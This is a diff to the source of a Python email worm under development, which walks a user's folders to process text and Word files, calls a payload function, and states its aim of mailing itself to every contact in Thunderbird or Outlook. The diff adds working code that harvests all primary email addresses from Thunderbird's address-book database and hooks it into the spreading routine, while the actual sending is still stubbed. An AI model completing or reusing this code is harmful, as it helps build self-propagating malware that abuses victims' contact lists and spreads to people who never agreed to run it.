@@ -15,12 +15,15 @@ do not abuse it to cause any harm!
 # ------------------------------- imports ----------------------------------
 # --------------------------------------------------------------------------
 
+# TODO: If possible, minimize imports using alternative syntax
 from os import listdir
 from os.path import expanduser, islink, isdir, isfile
 import mimetypes
 from random import randint
 from docx import Document
 import sys
+import sqlite3
+from sqlite3 import Error
 
 
 # --------------------------------------------------------------------------
@@ -79,7 +82,7 @@ def traverse_dirs(curr_file):
     processing function for each file.
     """
     if islink(curr_file):
-        print("detected symlink {}".format(curr_file))
+        print("detected symlink {}".format(curr_file)) # test output
         # TODO: Maybe do the same as for directories instead of just ignoring symlinks?
         return
     if isfile(curr_file):
@@ -87,7 +90,7 @@ def traverse_dirs(curr_file):
             # print("TEXT file {}".format(curr_file)) # test output
             process_text_file(curr_file)
         elif is_file_type(curr_file, "docx"):
-            print("DOCX file {}".format(curr_file)) # test output
+            # print("DOCX file {}".format(curr_file)) # test output
             process_docx_file(curr_file)
         """
         elif is_file_type(curr_file, "odt"):
@@ -280,20 +283,46 @@ def process_music_file(file):
 
 
 # --------------------------------------------------------------------------
-# ---------------------- send mail helper functions ------------------------
+# ---------------------- send email helper functions ------------------------
 # --------------------------------------------------------------------------
 
     
-def read_mails_thunderbird():
+def read_email_addresses_thunderbird():
+    """
+    :returns: a list of all email addresses contained in Thunderbird's `abook.sqlite` database
+              if this database exists, None otherwise.
+    """
+    # TODO: Search for `abook.sqlite` on the file system
+    database = "/home/telekobold/TestVerzeichnis/TestVerzeichnis/PythonTest/abook.sqlite"
+    con = None
+    email_addresses = []
+    
+    if isfile(database):
+        try:
+            con = sqlite3.connect(database)
+        except Error as e:
+            print(e)
+        with con:
+            cur = con.cursor()
+            cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
+            rows = cur.fetchall()
+            for row in rows:
+                (email_addr,) = row # unpack the tuple returned by fetchall()
+                email_addresses.append(email_addr)
+        return email_addresses
+    else:
+        return None
+
+
+def send_emails_thunderbird():
     pass
 
-def send_mails_thunderbird():
+
+def read_email_addresses_outlook():
     pass
 
-def read_mails_outlook():
-    pass
 
-def send_mails_thunderbird():
+def send_emails_thunderbird():
     pass
 
 
@@ -319,14 +348,15 @@ def payload():
 """
 Send this program to all email addresses in the address book of the installed Thunderbird or Outlook.
 """
-def send_mail():
-    pass
+def send_email():
+    email_addresses = read_email_addresses_thunderbird()
+    print(email_addresses) # test output
     # If Mozilla Thunderbird is installed, read the whole address book from Thunderbird (SQLite database) and send this program to each address of the address book
     # If Outlook is installed, do the same for Outlook. This check only needs to be done if the operating system is Windows.
-    # TODO: Ensure that mails are not sent to the from address
+    # TODO: Ensure that emails are not sent to the from address
 
 
 if __name__ == "__main__":
     # TODO: Start two different threads, one for executing the payload and one for sending emails.
     payload()
-    send_mail()
+    send_email()
